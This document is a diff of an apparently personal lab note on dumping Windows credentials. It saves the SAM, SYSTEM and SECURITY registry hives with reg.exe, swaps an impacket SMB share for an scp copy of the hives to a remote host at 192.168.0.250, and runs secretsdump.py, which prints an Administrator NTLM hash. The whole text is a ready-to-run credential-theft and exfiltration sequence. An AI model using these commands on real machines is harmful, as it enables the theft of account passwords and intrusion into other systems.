@@ -12,11 +12,7 @@ reg.exe save HKEY_LOCAL_MACHINE\SYSTEM C:\Temp\SYSTEM /y
 reg.exe save HKEY_LOCAL_MACHINE\SAM C:\Temp\SAM /y
 reg.exe save HKEY_LOCAL_MACHINE\SECURITY C:\Temp\SECURITY /y
 
-**Linux:**
-sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support Labaratory /home/sako/Labaratory
-
-**Windows:**
-copy SYSTEM \\192.168.0.250\Labaratory
+scp C:\Windows\System32\config\SYSTEM sako@192.168.0.250:/home/sako/Labaratory/ ( SSH File Sender )
 
 python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
